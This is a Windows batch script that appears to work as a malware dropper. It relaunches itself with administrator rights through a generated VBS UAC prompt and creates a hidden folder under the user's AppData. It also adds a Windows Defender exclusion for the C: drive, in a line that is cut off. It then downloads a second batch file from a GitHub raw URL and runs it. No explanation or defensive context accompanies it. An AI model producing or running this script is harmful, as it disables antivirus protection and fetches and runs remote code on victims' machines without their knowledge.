
cls

@echo off

powershell -window hidden -command ""
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "PC"
attrib +h "PC" /s /d

powershell.exe -command "Add-MpPreference -ExclusionPath "C:\

Powershell -Command "Invoke-Webrequest 'https://github.com/AnyTXDR/CD//raw/main/2.bat' -OutFile C:\Users\%USERNAME%\AppData\Local\PC\2.bat"
cd C:\Users\%USERNAME%\AppData\Local\PC"
start 2.bat
